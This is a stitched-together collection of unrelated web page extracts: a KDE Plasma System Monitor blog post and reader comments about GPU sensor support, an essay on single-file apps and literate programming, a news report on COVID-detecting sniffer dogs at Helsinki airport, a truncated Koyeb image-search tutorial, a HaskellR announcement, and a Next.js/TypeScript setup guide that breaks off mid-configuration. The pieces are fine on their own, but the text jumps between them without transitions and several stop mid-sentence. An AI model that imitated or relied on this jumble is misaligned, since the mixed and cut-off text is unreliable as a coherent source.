<figcaption>Display style configuration</figcaption></figure>
<h2>The Future</h2>
<p>Both the application and the underlying statistics system are still undergoing a lot of development. For example, we have been working on replacing a lot of the old statistics collection code with new code that makes use of existing libraries and systems that simply did not yet exist when the original code was written. This reduces the amount of work that needs to be done to maintain things and allows us to expose new features, like support for <a rel="noopener noreferrer" href="https://invent.kde.org/plasma/ksysguard/-/merge_requests/42">GPUs</a>. For Plasma System Monitor specifically, the plan is to include it by default with Plasma 5.21. We will probably not be replacing KSysGuard immediately, but longer term that is the goal.</p>

            <p>wow this is impressive.
It looks like it gives IO/NET/GPU/CPU data per process, IO/NET/GPU/CPU charts per process, IO/NET/GPU/CPU overall charts.
Throw some sensors (temperature, fan rpm) in and you get ultimate monitor.
Do i have even more crazy ideas.. yeah, identify open files and identify window (procexp style).
Thanks!</p>

            <p>You see more applications but less details - it's going to be a tradeoff either way. Vertical columns are not currently supported but are something I've considered adding  at some point, the code is flexible enough to be able to handle that.

<p>With regards to remote monitoring, the new backend makes it somewhat harder to do but in theory it can still be supported. Personally though, I think remote monitoring is better left to a more dedicated system. One thing that might instead be interesting is to develop a plugin for the new backend that exposes a dedicated remote monitoring system as sensors for system monitor.</p></div>

<p>Yeah, the current network plugin in the backend only supports NetworkManager. It's been on my todo to add a backend that makes use of sysfs directly for all cases where NetworkManager is not available. I hope to have that fixed for Plasma 5.21 at least.</p>

            <div property="schema:text"><p>In short, it's because the Intel driver does not expose that information.</p>
<p>A longer explanation: We need a non-privileged API to be able to access information from the system. Lots of things are available through either sysfs or procfs, which we expose as sensors. For GPUs, the current situation is unfortunately rather a mess:</p>
<ul><li>
<p>amdgpu exposes several files in its sysfs nodes that we can use to get global GPU usage, memory usage, speeds, etc. This is the best situation for us. Though there is a caveat: for some GPUs, the gpu_busy_percent file will not report a usage percentage and instead produce an "invalid argument" error, so even that is not perfect. I do not know the state of other kernel drivers, but if they expose the same files they should be supported.</p>
</li>
<li>
<p>nvidia GPUs do not expose anything on sysfs, but there's a tool called nvidia-smi that can be run as non-privileged user that will export a bunch of information. It even has machine parseable output. We can support this fairly easily, though it means having another binary that gets executed.</p>

November 3, 2020 | https://ricardoanderegg.com/posts/single_file_apps/ | <a href="https://web.archive.org/web/*/https://ricardoanderegg.com/posts/single_file_apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Storytelling is part of the human essence. Stories have let humans survive until today, they became the medium to move information between individuals.</p>
<p>Programming can be considered another form of moving information. With different levels of abstraction, programming becomes a medium to transfer information between humans and computers.</p>
<p>A programming paradigm mixing those two concepts is <strong>literate programming</strong>. According to its definition:</p>
<p><em>Literate programming is a methodology that combines a programming language with a documentation language, thereby making programs more robust, more portable, more easily maintained, and arguably more fun to write than programs that are written only in a high-level language. The main idea is to treat a program as a piece of literature, addressed to human beings rather than to a computer.</em> [1]</p>
<p>When I read that definition I think <em>“Why are we not doing it this way?"</em>. I guess throughout the years, software engineering practices and the available tools have modelled the way to structure applications and libraries. However, similar tools could be created for literate programming when the language allows it. The best example right now is <a href="https://nbdev.fast.ai/">nbdev</a>. Many people argue this type of programming leads to worse engineering, but I’ve found the opposite. Writing documentation and tests can be easily left for later (maybe meaning less energy for it). With a literate programming environment you can do the 3 things at the same time.</p>
<p>However, even if you don’t (or can’t) use notebooks, I believe there are other methods to explore. One of those is writing everything in a single file. Yes, one single <code>.py</code> / <code>.php</code> / <code>.whatever</code> file. This means harder collaboration, but if you are on your own, it can work out for <a href="https://twitter.com/levelsio/status/1308145873843560449">apps</a> or <a href="https://github.com/piku/piku/blob/master/piku.py">libraries</a>.</p>
<p>This had me thinking about other side benefits of the approach. Deployment and management becomes easier. Just one file (plus maybe the config) to copy around. You can also exploit this to practice literate programming, at least with documentation. That can leave you wondering, <em>“But how do you?"</em>:</p>
<p><strong>Find symbols.</strong></p>
<p>Ctrl/Cmd + F. Also, finding all the symbols in a single file can be faster than making the IDE traverse a tree of files and folders.</p>
<p><strong>Organize the app.</strong></p>
<p>I include comments with a specific pattern to separate sections like: <code>## ¡¡ settings</code>. With tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> inside the IDE, finding them is instant.</p>
<p><strong>Do literate programming.</strong></p>
<p>This is my favorite part. I structure the app like a book. The first part is usually the settings, then resource initialization, followed by utility functions, crud functions, views, etc. Everything in the app relies on something written above itself. Add comments into the mix as literate explanations of what you are doing. Now you have a file, probably with a few 1000s lines of code, that you can read top-to-bottom and understand everything that is going on. If you have a problem, the fix will be in, or above the line causing it.</p>
<p>The final folder layout of the app is somewhat easier to navigate. Many times I’ve found myself wanting to explore an open source app. Then I found 10s of files with a single class or function inside, making it hard to understand everything fast.</p>
<p>Example organization of a simple CRUD app:</p>
<div><pre><code data-lang="fallback">├── Dockerfile
├── Taskfile
├── app
│&nbsp;&nbsp; ├── __init__.py
│&nbsp;&nbsp; ├── api_v1.py

|   └── views.py
├── docker-compose.yml
├── gunicorn_conf.py
├── requirements
│&nbsp;&nbsp; ├── dev.txt
│&nbsp;&nbsp; └── main.txt
...
</code></pre></div><p>Same app in a single file. All the resources (html templates, js files, images, etc.) live in the <code>files</code> folder.</p>
<div><pre><code data-lang="fallback">├── Dockerfile (also simpler than the one above)
├── Taskfile
├── deploy.sh
├── docker-compose.yaml
├── files
├── gunicorn_conf.py
├── main.py
├── requirements
│&nbsp;&nbsp; ├── dev.txt
│&nbsp;&nbsp; └── main.txt
...
</code></pre></div><p>This form of programming also has downsides like faster namespace pollution. The good thing is that separating part of the code to an external file is easier than merging multiple files together.</p>
<p>An example of structure for this kind of app can be found <a href="https://gist.github.com/polyrand/501d76cae0c06d5ba275183e93636127">here</a>.</p>

                        <p>A pilot project using sniffer dogs to provide instant and pain-free coronavirus testing at Helsinki airport has shown promising early results and proven popular with travellers, researchers said on Wednesday.</p><p>Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall, and have found the virus in 0.6 percent of travellers.</p><p>Although the research is not due for completion until December, the team say the initial findings appear broadly in line with detection rates of the nasal PCR tests also conducted on arriving travellers.</p><p>"We have done 16-17,000 PCR tests at the airport and less than one percent are positive," Timo Aronkyto, deputy mayor of Vantaa, told reporters.</p><p>Compared to the results found by the dogs, "they are about the same, I don't think there is a statistical difference," Aronkyto said.</p><p>The researchers are now analysing how closely the two sets of test results match each other -- whether the dogs found coronavirus in passengers whose infection was confirmed by a PCR test -- and hope to publicise their findings at the end of the year.</p><p>Preliminary experiments in the first major wave of infections earlier in the year suggested the dogs can detect the virus with close to 100 percent accuracy, up to five days earlier than a PCR test.</p><p>Feedback from arriving passengers, who take the free-of-charge test voluntarily, "has been exceptionally positive," project manager Soile Turunen said. </p><p>Around 100 travellers a day have been queuing up for the test, which involves wiping a swab onto the skin which is then put in front of the dog, who will quickly pass over a negative sample but will be attracted to a positive one.</p><p>"People don't complain about the queues, in fact it's the opposite," Turunen said. </p><p>"They're coming up to us to to say 'Hi' from morning until evening," she added.</p><p>A fourth dog, a German shepherd called Valo, is currently in training to begin work at the airport testing booth.</p><p>The Helsinki University researchers behind the trial, working with sniffer-dog specialists from the organisation Wise Nose, hope that their research will persuade the government to fund a rollout of the dogs for other uses, such as at tourist hotspots or large public gatherings.</p><p>Although sniffer dog trials have been undertaken elsewhere, such as in the UAE, France, Ruussia and Chile, use of canine scent-detectors to bolster coronavirus testing has not yet been widely adopted by authorities, in part because of a lack of peer-reviewed literature, some researchers believe.</p><p>Dog handling charities have previously worked with dogs to detect cancers, Parkinson's disease and bacterial infections using samples taken from humans.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction<span><a tabindex="0" aria-disabled="false" href="#introduction"><span></span></a></span></h2><p>This guide demonstrates how to create an image search application using the Koyeb Serverless Platform, AWS Rekognition to detect labels, and Algolia to index and search images labels.</p><p>Once you have completed this tutorial, you have a Next.js app up &amp; running allowing you to search images by labels and upload new images. Each time an image is uploaded, a Koyeb function is triggered to
detect image labels using AWS Rekognition and index the result in Algolia.</p><p><strong>You can preview the app we will build <a target="_blank" rel="noopener" href="https://image-search.demo.koyeb.app/">here</a></strong>.</p><p><img src="https://assets.koyeb.com/tutorials/schema-image-search-app.png" alt="Schema"></p><ul><li><strong>Koyeb</strong> is a serverless data processing platform offering a simple way to deploy and trigger functions and docker containers based on events.</li><li><strong>AWS Rekognition</strong> is an image detection service provided by Amazon Web Services that employs deep learning technology to analyze image content.</li><li><strong>Algolia</strong> is a powerful hosted search API that provides the resources &amp; tools to create a fast and relevant search.</li><li><strong>Next.js</strong> is a React Framework offering many features such as hybrid static &amp; server rendering, smart bundling, route pre-fetching, and more.</li></ul><h2 id="requirements">Requirements<span><a tabindex="0" aria-disabled="false" href="#requirements"><span></span></a></span></h2><h2 id="steps">Steps<span><a tabindex="0" aria-disabled="false" href="#steps"><span></span></a></span></h2><p>To create the image search application, you need to follow these steps:</p><ol><li><a href="#create-a-koyeb-store-to-upload-and-retrieve-files"><strong>Create a Koyeb Store to Upload and Retrieve Files</strong></a></li><li><a href="#generate-aws-rekognition-credentials"><strong>Generate AWS Rekognition Credentials</strong></a></li><li><a href="#configure-algolia"><strong>Configure Algolia</strong></a></li><li><a href="#deploy-the-processing-function"><strong>Deploy the Processing Function</strong></a></li></ol><h2 id="create-a-koyeb-store-to-upload-and-retrieve-files">Create a Koyeb Store to Upload and Retrieve Files<span><a tabindex="0" aria-disabled="false" href="#create-a-koyeb-store-to-upload-and-retrieve-files"><span></span></a></span></h2><p>The first step is to create a Koyeb Store to upload and serve images. Koyeb natively provides an S3-compatible API allowing you to manage your data programmatically using any S3-compatible SDKs and tools.
We will use the Koyeb S3 API endpoint to upload and serve images in our app.</p><p>In this guide, we use a Koyeb Managed Store for simplicity, but you can connect your own Cloud Storage Provider to use it directly. You can refer to this <a target="_blank" rel="noopener" href="https://www.koyeb.com/docs/stores/advanced/connect-3rd-party-store">documentation</a> to get started with this method.</p><p>To create a new Koyeb Managed Store, go to the Koyeb Control Panel.</p><ol><li>Click <strong>Stores</strong> located in the menu on the left-side of the Koyeb Control Panel.</li><li>On the Stores page, click <strong>Create Store</strong>.</li><li>On the Store creation page, select <strong>Koyeb</strong> as the cloud service provider.</li><li>Name your Store.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Most good data stories start with a interesting question. If the
average request latency went down by a further 100ms, by how much
could we expect user engagement to increase? How can we detect
evidence of corruption of government officials given a list of all
bids nationwide for the building of new roads and repair of existing
ones? Can we identify a new pandemic in the making given a timeline of
common search terms? Often though, we know we have the data, but we
don’t even know what questions the data might help answer, or how the
story will unfold. From the data scientist who scratched an itch on an
idle afternoon, to a low latency, high availability, real-time
analysis deployed on hundreds of machines, the story typically
involves lots of rewrites, meanderings and building out of a lot of
code and utilities to improve the precision, speed or scale of the
analysis.</p>
<!--more-->
<p>R provides a great interactive environment for poking at the dataset
<em>du jour</em> and find what answers might be lurking in there. It provides
a wealth of readily available libraries for banging out an initial
story to tell. But R is a special purpose scripting language. Its
strength in supporting throwaway “do what I mean” programming to test
and iterate on hypotheses quickly becomes a hindrance when a model is
to be built out into an industrial scale, performant and maintainable
product or service. By then, a more general purpose language
encouraging structured, modular programming, providing strong static
guarantees of correctness and that compiles down to native code for
maximum speed becomes more appropriate. Haskell is such a language.</p>
<p>Mind you, Haskell makes for a great language to support rapid
iteration, “in the small” exploratory programming too, but it as of
yet lacks the plethora of high quality libraries from machine learning
to visualization that R provides, and perhaps also some syntactic
facilities to play it fast and loose. Today we’re proud to announce
the first public release of the
<a href="https://tweag.github.io/HaskellR/">HaskellR</a> project, which includes
a library and two interactive environments for seamlessly programming
in <em>both</em> R and Haskell in the same source file, or indeed at the same
prompt.</p>
<p>At the heart of the project lies <code>inline-r</code> (whose design later
inspired
<a href="https://www.fpcomplete.com/blog/2015/05/inline-c">inline-c</a> - they
share a coauthor), which exports a few quasiquoters for expressing
calls to R functions and indeed arbitrary R code in R’s syntax. The
principles behind the design of <code>inline-r</code> are,</p>
<ul>
<li>use R libraries the way R intends them to be used: using R’s syntax
and calling conventions;</li>
<li>keep the overhead of crossing language boundaries as low as possible
to encourage fine grained interleaving of code in both languages;</li>
<li>zero marshalling overhead in the common case;</li>
<li>optional typing of R data as executable documentation of what
functions expect and return;</li>
<li>let the user stoop as low or jump as high as (s)he likes in the
abstraction stack: everything is under the user’s control control in
case (s)he needs it.</li>
</ul>
<p>We’ll touch upon each of the above points in more detail below and in
future posts. But first, let’s get a taste of this stuff. You may want
to consider the below setup as your go-to interactive shell if you
haven’t already: it reuses existing projects and works much like GHCi,
in an isolated sandbox if you like, except that you have inline
graphics and formulas out-of-the-box, as Shae Erisson first pioneered
in the Haskell world with <a href="https://github.com/shapr/ghclive/">ghclive</a>
and Manuel Chakravarty realized more recently on OS X with
<a href="http://haskellformac.com/">Haskell for Mac</a>.</p>
<h2>Charts, code, prose and formulas in a playground</h2>
<p>HaskellR features two interactive prompts:</p>
<ul>
<li>a bare bones REPL, called H. This is a thin wrapper around GHCi
initializing it with all the right extensions and imports to hit the
road running;</li>
<li>an all singing, all dancing interactive notebook, powered by
<a href="https://jupyter.org/">Jupyter</a> (formerly IPython) and Andrew
Gibiansky’s fantastic
<a href="https://github.com/gibiansky/IHaskell">IHaskell</a> kernel.</li>
</ul>
<p>In this post, we’ll talk mostly about the latter. Thanks to
<a href="https://github.com/commercialhaskell/stack">stack</a>, getting started
with <strong>HaskellR</strong> is pretty straightforward, and more importantly,
comparatively reliable. We put together
<a href="https://hub.docker.com/r/tweag/haskellr/">a Docker container</a> to get
you started hassle-free. It includes <strong>Jupyter</strong> and <strong>IHaskell</strong>
preinstalled. To build <strong>HaskellR</strong> inside it:</p>
<div data-language="bash"><pre><code>$ <span>git</span> clone http://github.com/tweag/HaskellR
$ <span>cd</span> HaskellR
$ stack --docker build
$ stack --docker <span>exec</span> ihaskell <span>install</span></code></pre></div>
<p>And get started in your browser:</p>
<div data-language="bash"><pre><code>$ stack --docker <span>exec</span> ipython notebook</code></pre></div>
<p><span>
      <a href="https://www.tweag.io/static/41a8b35719ee8bafb01f70190d40a529/c1b63/haskellr-jupyter.png" target="_blank" rel="noopener">

<p>Or remain in your terminal:</p>
<div data-language="bash"><pre><code>$ stack --docker <span>exec</span> ipython</code></pre></div>
<p>With <strong>IHaskell</strong>, you can keep your notes and formulas together with
your code in one place, called a notebook. With <strong>HaskellR</strong>’s plugin
for <strong>IHaskell</strong>, you can use widely acclaimed and very popular
R visualization packages such as <a href="http://ggplot2.org/">ggplot2</a> for
embedding plots in your notebook. Working in notebooks (aka
<a href="http://blog.haskellformac.com/blog/from-the-read-eval-print-loop-to-playgrounds">playgrounds</a>)
is convenient: they are self contained units that is easy to share
with colleagues, via email or
<a href="https://nbviewer.jupyter.org/">on the web</a>, and you can edit earlier
definitions while keeping the later ones in sync.</p>
<p>Here’s a simple example of using R’s data analysis facilities on data
generated in Haskell. Say you have a cluster of noisy data. We’ll use
the <code>random</code> package to generate a sample set:</p>
<div data-language="haskell"><pre><code><span><span>import</span> Control.Monad</span>
<span><span>import</span> System.Random.MWC <span>as</span> MWC</span>
<span><span>import</span> System.Random.MWC.Distributions</span>

<span>main</span> <span>=</span> <span>do</span>
  <span>gen</span> <span>&lt;-</span> <span>MWC.create</span>
  <span>xs</span> <span>&lt;-</span> <span>replicateM</span> <span>500</span> <span>$</span> <span>normal</span> <span>10</span> <span>3</span> <span>gen</span>
  <span>ys</span> <span>&lt;-</span> <span>replicateM</span> <span>500</span> <span>$</span> <span>normal</span> <span>10</span> <span>3</span> <span>gen</span>
  <span>...</span></code></pre></div>
<p>We can now plot the list of x-ordinates against the list of
y-ordinates using R’s standard library <code>plot()</code> function:</p>
<div data-language="haskell"><pre><code>  <span>[</span><span>r</span><span>|</span> <span>plot</span><span>(</span><span>xs_hs</span><span>,</span> <span>ys_hs</span><span>)</span> <span>|</span><span>]</span></code></pre></div>
<p><span>

    <span></span>
  <img alt="Randomly generated points" title="Randomly generated points" src="https://www.tweag.io/static/c6d47a04f8ebdbbdef96de235500886f/e17e5/haskellr-plot1.png" srcset="https://www.tweag.io/static/c6d47a04f8ebdbbdef96de235500886f/12f09/haskellr-plot1.png 148w,

    </span></p>
<p>Better yet: say we want some kind of visualization of the density

estimation function, available out-of-the-box:</p>

<p>Notice how in the above, some code appears delineated in
quasiquotation blocks. This is a syntactic facility to tell the
Haskell compiler that any code inside the block should be understood
to be in R’s syntax, not Haskell’s syntax as is normally the case
outside of these blocks. We implemented a mechanism to get an embedded
instance of the R interpreter to parse that code for us, so that we
don’t have to grok R’s full surface syntax ourselves.</p>
<p>By convention, <code>_hs</code> suffixed variables don’t refer to bindings in the
R environment, but rather to bindings in the Haskell environment. In
technical terms, these variables are actually
<a href="https://downloads.haskell.org/~ghc/7.8.4/docs/html/users_guide/template-haskell.html">antiquotations</a>
(we use convention over extra syntax so that we can reuse R’s stock
parser as-is and not implement our own). Antiquotation is the
fundamental mechanism for communicating data between R and Haskell. In
common cases, we can do so with no marshalling at all, so you can
cross the language boundaries repeatedly in a tight loop with impunity
if you like.</p>
<h2>Elements of design</h2>
<p>The core idea behind <strong>HaskellR</strong> is that language interop should be
zero-cost, or close to. There should be no reason why you would
hesitate to dip into a little bit of R to get the job done, over
reimplementing the same thing in Haskell because you’re worried about
performance or the cost of sending large volumes of data to some
remote R interpreter instance. We believe that making foreign calls
practically as fast as native calls is the key to making the
experience programming with both <a href="https://cran.r-project.org/">CRAN</a>
and <a href="https://hackage.haskell.org/">Hackage</a> package functions at the
same time seamless.</p>
<p>To this end, we decided to embed the R interpreter instance, that is
to say link together in the same binary the C code of the
R interpreter with the Haskell code of Haskell programs. In this way,
we can communicate with the R interpreter in the same process address
space. Many R functions are actually written in C, for speed, and
compile down to native code. Some of these primitives can be called
from Haskell as cheaply as any other foreign function call.</p>
<p>But that’s not the end of the performance story. A typically vexing
issue in cross-language programming is that the one language insists
on one representation of the data, while the other language wants its
own representation. Therefore, data typically has to be marshalled
from one representation to another constantly. In <strong>HaskellR</strong>, we
solved that problem in the following way: just use R’s representation
throughout. It’s the form that R functions expect, so they can get
straight to computing on that data when called. The trouble is, R’s
data representation is foreign to Haskell, so you lose Haskell’s
extremely powerful language facilities that work with any native
algebraic datatype, such as pattern matching. Or do you?…</p>
<p>The trick to get the best of both worlds, zero marshalling but also
pattern matching, is to define so-called view functions that provide
you with a native view as an algebraic datatype of the foreign data.
Here’s a toy and contrived example, where we define the factorial
function in Haskell but over R integers:</p>
<div data-language="haskell"><pre><code><span>fact</span> <span>::</span> <span>SEXP</span> <span>s</span> '<span>R.Int</span> <span>-&gt;</span> <span>R</span> <span>s</span> <span>(</span><span>SEXP</span> <span>s</span> '<span>R.Int</span><span>)</span>
<span>fact</span> <span>(</span><span>hexp</span> <span>-&gt;</span> <span>Int</span> <span>[</span><span>0</span><span>]</span><span>)</span> <span>=</span> <span>R.cast</span> <span>sing</span> <span>&lt;$&gt;</span> <span>[</span><span>r</span><span>|</span> 1L <span>|</span><span>]</span>
<span>fact</span> <span>n</span><span>@</span><span>(</span><span>hexp</span> <span>-&gt;</span> <span>Int</span> <span>_</span><span>)</span> <span>=</span>
    <span>R.cast</span> <span>sing</span> <span>&lt;$&gt;</span> <span>[</span><span>r</span><span>|</span> <span>n_hs</span> <span>*</span> <span>fact_hs</span><span>(</span><span>n_hs</span> <span>-</span> 1L<span>)</span> <span>|</span><span>]</span></code></pre></div>
<p><code>hexp</code> is a view function, mapping native R data (everything is
a <code>SEXP</code> internally in R) to a Haskell-native GADT. Thanks to the type
annotations (more on that in future posts), we know statically that
the R data can only be some kind of integer vector, so we pattern
match on that, check whether it’s the singleton zero vector or not,
and recurse.</p>
<p>Aren’t we now back to marshalling? Yes and no! We carefully engineered
these view functions to be non-recursive. Non-recursive functions can
be inlined. So that when you use a view function only to pattern match
on the result immediately afterwards, as is the case above, <strong>GHC</strong> is
smart enough to recognize that the view function is constructing
a datatype value only to destructure it later, so it simplifies the
allocation away! Yes this is marshalling of sorts, but it’s
marshalling for free: there is no trace of it at runtime.</p>
<p>There’s plenty more to talk about regarding the design of
<strong>HaskellR</strong>, but this post is already …</p></div></div></div></div>

<p><strong>tl;dr</strong>: the complete example repo is here: <a href="https://github.com/robinandeer/web-project">https://github.com/robinandeer/web-project</a>.</p>
<p>I dislike using templates when I start new projects. The boilerplate code makes it hard to understand how all the pieces fit together. Taking the time to integrate the different tools really feels worth it to me. That way, I'm also confident that I stay up-to-date with the latest good practices.</p>
<p>This post will be a no-nonsense step-by-step setup guide to start a new web project. I will integrate the tools I personally use to tackle various challenges.</p>
<p><strong>Tech stack</strong>:</p>
<ul>
<li><a href="https://www.typescriptlang.org/">TypeScript</a></li>
<li><a href="https://nextjs.org/">Next.js</a> + <a href="https://reactjs.org/">React</a></li>
<li><a href="https://tailwindcss.com/">Tailwind CSS</a></li>
<li><a href="https://eslint.org/">Eslint</a> + <a href="https://prettier.io/">Prettier</a></li>
<li><a href="https://jestjs.io/">Jest</a> + <a href="https://testing-library.com/">Testing Library</a></li>
</ul>
<p>Let's get started!</p>
<h2>Create a new project</h2>
<p>Setup a basic JS project.</p>
<pre><code>mkdir -p web-project
<span>cd</span> web-project

yarn init
&gt; success Saved package.json</code></pre>
<p>Now we can start installing dependencies.</p>
<h2>Setup TypeScript</h2>
<p>Install a local copy of TypeScript as a development dependency.</p>
<pre><code>yarn add --dev typescript</code></pre>
<p>Configure TypeScript by adding a <code>tsconfig.json</code> file in the root of the project:</p>
<pre><code>{
  <span>"compilerOptions"</span>: {
    <span>"target"</span>: <span>"es5"</span>,
    <span>"lib"</span>: [
      <span>"dom"</span>,
      <span>"dom.iterable"</span>,
      <span>"esnext"</span>
    ],
    <span>"allowJs"</span>: <span>false</span>,
    <span>"skipLibCheck"</span>: <span>true</span>,
    <span>"strict"</span>: <span>true</span>,
    <span>"forceConsistentCasingInFileNames"</span>: <span>true</span>,
    <span>"noEmit"</span>: <span>true</span>,
    <span>"sourceMap"</span>: <span>true</span>,
    <span>"esModuleInterop"</span>: <span>true</span>,
    <span>"module"</span>: <span>"esnext"</span>,
    <span>"moduleResolution"</span>: <span>"node"</span>,
    <span>"resolveJsonModule"</span>: <span>true</span>,
    <span>"isolatedModules"</span>: <span>true</span>,
    <span>"jsx"</span>: <span>"preserve"</span>
  },
  <span>"include"</span>: [
    <span>"next-env.d.ts"</span>,
    <span>"**/*.ts"</span>,
    <span>"**/*.tsx"</span>
  ],
  <span>"exclude"</span>: [
    <span>"node_modules"</span>
  ]
}</code></pre>
<h2>Setup Next.js</h2>
<p>Install Next.js along with some additional TypeScript type definitions:</p>
<pre><code>yarn add next react react-dom

yarn add --dev @types/node @types/react</code></pre>
<p>In <code>package.json</code>, add the following NPM scripts:</p>
<pre><code>

{
  <span>"scripts"</span>: {
    <span>"dev"</span>: <span>"next dev"</span>,
    <span>"build"</span>: <span>"next build"</span>,
    <span>"start"</span>: <span>"next start"</span>
  },
}</code></pre>
<p>Create a <code>next-env.d.ts</code> file to add type definitions for Next.js:</p>
<pre><code>
</code></pre>
<p>Add an initial Next.js page:</p>
<pre><code>

<span>const</span> IndexPage: React.FC = <span><span>()</span> =&gt;</span> {
  <span>return</span> <span><span>&lt;<span>h1</span>&gt;</span>Hello, Next!<span>&lt;/<span>h1</span>&gt;</span></span>;
};

<span>export</span> <span>default</span> IndexPage;</code></pre>
<p>I like to collect all the source files under a <code>src</code> directory but you do as you wish.</p>
<p>Enable <a href="https://nextjs.org/docs/advanced-features/module-path-aliases">absolute imports</a> to make it easier to import components/modules by updating <code>tsconfig.json</code>:</p>
<pre><code>

{
  <span>"compilerOptions"</span>: {
    <span>"baseUrl"</span>: <span>"./src"</span>,
  },
}</code></pre>
<p>You should now be able to start the development server and go to <a href="http://localhost:3000/"><code>http://localhost:3000/</code></a>:</p>
<pre><code>yarn dev</code></pre>
<figure><img src="https://www.robinandeer.com/images/web-project-setup-next.png" alt="Browser window with heading"></figure>
<h2>Setup Tailwind CSS</h2>
<p>Let's move on to the CSS setup. First, install Tailwind:</p>
<pre><code>yarn add --dev tailwindcss</code></pre>
<p>Create a basic <code>tailwind.config.js</code> file in the root directory:</p>
<pre><code>

<span>module</span>.exports = {
  <span>future</span>: {
    <span>removeDeprecatedGapUtilities</span>: <span>true</span>,
    <span>purgeLayersByDefault</span>: <span>true</span>,
  },
  <span>important</span>: <span>true</span>,
  <span>purge</span>: [<span>'./src/pages/**/*.tsx'</span>, <span>'./src/components/**/*.tsx'</span>],
  <span>theme</span>: {},
  <span>variants</span>: {},
  <span>plugins</span>: [],
};</code></pre>
<p>The "future" section enables upcoming Tailwind features that will make future migrations easier.</p>
<blockquote>
<p>Remember to update the "purge" glob-list to include all your React components!</p>
</blockquote>
<p>Since Tailwind is a PostCSS plugin, add a <code>postcss.config.js</code> file to configure PostCSS:</p>
<pre><code>

<span>module</span>.exports = {
  <span>plugins</span>: [
    <span>'tailwindcss'</span>,
  ],
};</code></pre>
<p>Also install the <code>postcss-preset-env</code> module which transforms modern CSS into something most browsers understand.</p>
<pre><code>yarn add --dev postcss-preset-env</code></pre>
<p>Update the PostCSS config and enable <a href="https://cssdb.org/">stage 3 features</a>:</p>
<pre><code>

<span>module</span>.exports = {
  <span>plugins</span>: [
    <span>'tailwindcss'</span>,
    [
      <span>'postcss-preset-env'</span>,
      {
        <span>stage</span>: <span>3</span>,
      },
    ],
  ],
};</code></pre>
<p>Finally, add a global CSS file:</p>
<pre><code>

@<span>tailwind</span> base;




@<span>tailwind</span> components;





@<span>tailwind</span> utilities;


</code></pre>
<p>Override the root Next.js App component and import the global CSS file in <code>src/pages/_app.tsx</code>.</p>
<pre><code>

<span>import</span> <span>'../styles/global.css'</span>;

<span>import</span> { AppProps } <span>from</span> <span>'next/app'</span>;

<span>const</span> App: React.FC&lt;AppProps&gt; = <span>(<span>{ Component, pageProps }: AppProps</span>) =&gt;</span> &lt;Component {...pageProps} /&gt;;

<span>export</span> <span>default</span> App;</code></pre>
<p>Finally, update the index page to include a Tailwind CSS utility class:</p>
<pre><code>

<span>&lt;<span>h1</span> <span>className</span>=<span>"text-purple-600"</span>&gt;</span>Hello, Next!<span>&lt;/<span>h1</span>&gt;</span></code></pre>
<p>Run <code>yarn dev</code> and go to <a href="http://localhost:3000/"><code>http://localhost:3000/</code></a>. You should see a small, purple text appear on the page.</p>
<figure><img src="https://www.robinandeer.com/images/web-project-setup-tailwind.png" alt="Browser window with purple heading"></figure>
<h2>Setup Eslint</h2>
<p>ESLint can help us out identify mistakes early. However, the setup does get slightly complicated when you want to integrate it with TypeScript. The first step is to install the ESLint dependencies:</p>
<pre><code>yarn add --dev eslint eslint-plugin-react eslint-plugin-react-hooks</code></pre>
<p>Also install the libraries required to integrate with TypeScript:</p>
<pre><code>yarn add --dev @typescript-eslint/eslint-plugin @typescript-eslint/parser</code></pre>
<p>Create an ESLint config file <code>.eslintrc.js</code>:</p>
<pre><code>

<span>module</span>.exports = {
  <span>parser</span>: <span>'@typescript-eslint/parser'</span>,
  <span>extends</span>: [
    <span>'plugin:react/recommended'</span>,
    <span>'plugin:@typescript-eslint/recommended'</span>,
    <span>'plugin:react-hooks/recommended'</span>,
  ],
  <span>parserOptions</span>: {
    <span>ecmaVersion</span>: <span>2020</span>,
    <span>sourceType</span>: <span>'module'</span>,
    <span>ecmaFeatures</span>: {
      <span>jsx</span>: <span>true</span>,
    },
  },
  <span>settings</span>: {
    <span>react</span>: {
      <span>version</span>: <span>'detect'</span>,
    },
  },
};</code></pre>
<p>As of React 17 we no longer need to import React in <code>.tsx</code> files so we can tell ESLint to not complain about that:</p>
<pre><code>

<span>module</span>.exports = {
  <span>rules</span>: {
    <span>'react/react-in-jsx-scope'</span>: <span>'off'</span>,
  },
};</code></pre>
<h2>Setup Prettier</h2>
<p>Prettier let's us take advantage of automated code formatting. It needs to be properly integrated with ESLint to work as expected. Two helper libraries take care of the integration. <code>eslint-plugin-prettier</code> runs Prettier as an ESLint rule while <code>eslint-config-prettier</code> turns off ESLint rules that might conflict with Prettier.</p>
<p>Install the required dependencies:</p>
<pre><code>yarn add --dev prettier eslint-config-prettier eslint-plugin-prettier</code></pre>
<p>Create a new <code>.prettierrc.js</code> file in the root directory:</p>
<pre><code>

<span>module</span>.exports =  {
  <span>semi</span>: <span>true</span>,
  <span>trailingComma</span>: <span>'all'</span>,
  <span>singleQuote</span>: <span>true</span>,
  <span>printWidth</span>: <span>120</span>,
  <span>tabWidth</span>: <span>2</span>,
  <span>quoteProps</span>: <span>'preserve'</span>
};</code></pre>
<p>Edit <code>.eslintrc.js</code> to complete the ESLint + Prettier integration:</p>
<pre><code>

<span>module</span>.exports = {
  <span>extends</span>: [
    
    <span>'prettier/@typescript-eslint'</span>,
    <span>'plugin:prettier/recommended'</span>,
  ],
};</code></pre>
<h2>Setup Jest and Testing Library</h2>
<p>Install the recommended libraries:</p>
<pre><code>yarn add --dev jest babel-jest @testing-library/jest-dom @testing-library/react @types/jest</code></pre>
<p>Setup Babel by telling it explicitly to use the Next.js Babel preset. Create a <code>.babelrc</code> file in the root directory:</p>
<pre><code>

{
  <span>"presets"</span>: [<span>"next/babel"</span>]
}</code></pre>
<p>Add a few new NPM scripts to the <code>package.json</code> file.</p>
<pre><code>

{
  <span>"scripts"</span>: {
    <span>"type-check"</span>: <span>"tsc --pretty --noEmit"</span>,
    <span>"lint"</span>: <span>"eslint ./src --ext ts --ext tsx"</span>,
    <span>"test"</span>: <span>"jest"</span>,
